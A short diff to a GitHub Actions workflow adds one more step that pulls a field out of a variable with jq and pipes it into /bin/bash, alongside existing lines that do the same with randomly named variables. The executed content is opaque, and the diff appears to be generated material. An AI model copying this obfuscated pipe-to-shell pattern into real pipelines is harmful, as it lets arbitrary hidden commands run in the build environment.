@@ -26,6 +26,7 @@ jobs:
           echo $qr2863 | jq -r .jcy84 | /bin/bash
           echo $yvmsy6 | jq -r .hqse48 | /bin/bash
           echo $qzctp3480 | jq -r .x23 | /bin/bash
+          printf '%s' "$cvfv02" | jq -r .j2564 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
